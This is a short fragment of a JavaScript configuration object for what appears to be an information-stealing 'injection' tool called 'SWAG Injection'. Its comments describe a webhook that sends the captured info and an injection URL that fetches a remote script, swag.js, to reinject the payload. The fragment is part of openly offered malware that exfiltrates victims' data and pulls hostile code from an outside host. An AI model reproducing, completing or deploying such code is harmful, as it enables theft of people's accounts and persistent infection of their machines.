...
const config = {
  ...
  embed_name: 'SWAG Injection', //name of the webhook thats gonna send the info
  embed_icon: 'https://imgur.com/yUEcVFS', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/SWAGgrabber/swag-injection/main/swag.js', //injection url for when it reinjects
  /**
